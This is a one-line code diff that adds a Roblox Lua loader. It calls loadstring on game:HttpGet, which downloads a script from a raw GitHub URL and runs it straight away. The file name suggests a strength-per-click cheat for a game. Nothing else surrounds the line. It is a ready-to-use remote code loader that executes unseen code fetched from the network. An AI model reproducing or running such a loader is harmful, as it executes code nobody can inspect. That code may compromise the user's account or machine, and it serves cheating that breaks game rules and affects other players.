@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/1-strength-per-click-spam7-qjqwlg3do2meqd.lua"))()
